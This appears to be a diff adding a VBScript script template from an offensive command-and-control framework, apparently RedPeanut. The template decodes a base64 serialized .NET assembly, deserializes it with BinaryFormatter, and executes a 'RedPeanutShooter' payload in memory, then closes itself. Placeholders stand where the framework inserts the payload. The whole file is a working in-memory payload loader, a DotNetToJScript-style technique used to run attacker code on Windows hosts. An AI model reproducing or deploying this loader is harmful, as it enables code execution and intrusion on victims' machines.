@@ -1,0 +1,35 @@
+﻿<script language="VBScript">
+  #{assembly} = ""
+  #{hexassembly}
+
+Function Base64ToStream(b)
+  Dim enc, length, ba, transform, ms
+  Set enc = CreateObject("System.Text.ASCIIEncoding")
+  length = enc.GetByteCount_2(b)
+  Set transform = CreateObject("System.Security.Cryptography.FromBase64Transform")
+  Set ms = CreateObject("System.IO.MemoryStream")
+  ms.Write transform.TransformFinalBlock(enc.GetBytes_4(b), 0, length), 0, ((length / 4) * 3)
+  ms.Position = 0
+  Set Base64ToStream = ms
+End Function
+
+Function #{runcode}()
+  Dim shell, ver
+  Set shell = CreateObject("WScript.Shell")
+  ver = "v4.0.30319"
+  shell.Environment("Process").Item("COMPLUS_Version") = ver
+
+  Dim s
+  s = #{assembly}
+  Dim formatter, array, delegate, output
+  Set formatter = CreateObject("System.Runtime.Serialization.Formatters.Binary.BinaryFormatter")
+  Set array = CreateObject("System.Collections.ArrayList")
+  array.Add Empty
+  Set delegate = formatter.Deserialize_2(Base64ToStream(s))
+  Set output = delegate.DynamicInvoke(array.ToArray()).CreateInstance("RedPeanutShooter")
+  output.Execute
+end function
+
+#{runcode}()
+self.close
+</script>
